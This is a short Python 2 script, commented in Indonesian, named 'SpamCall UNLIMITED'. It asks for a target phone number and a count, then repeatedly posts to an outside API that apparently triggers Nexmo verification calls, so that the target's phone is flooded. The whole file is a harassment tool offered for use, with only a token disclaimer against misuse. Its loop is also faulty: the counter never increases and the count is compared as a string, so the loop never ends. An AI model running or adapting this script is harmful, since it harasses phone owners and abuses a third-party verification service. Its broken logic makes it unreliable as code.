#!/usr/bin/python
# -*- coding: utf-8 -*-
#SpamCall UNLIMITED
#Tolong jangan disalahgunakan,,resiko tanggung sendiri
# Bang Naga

import requests,json,time,subprocess
import os, time
import subprocess as sp

subprocess.call("clear", shell=True)

banner = """\033[0;32m
 =======================================
 ___  _                      _
|  _ \| |__  _ __ ___  __ _| | _____ _ __
| |_) | '_ \| '__/ _ \/ _` | |/ / _ \ '__|
|  __/| | | | | |  __/ (_| |   <  __/ |
|_|   |_| |_|_|  \___|\__,_|_|\_\___|_|

\033[1;34mCalling SPAM\033[1;36m UNLIMITED\033[0;32m
 =======================================
"""

x = 0
print banner
a = raw_input("[+] Lanjutkan (y/n): ")
s = raw_input("[+] Nomor Target : ")
d = raw_input("[+] Jumlah : ")
while x < d:
   b = {"https://xxnx.com":a}
   c = " https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor="
   e = requests.post(c+s, data=b)
   f = json.loads(e.text)
   if "nexmo_request_id" in f:
       print "[+] SUCESS WITH ID",f["nexmo_request_id"]
   else:
       print "[+] Spam Succes"
         
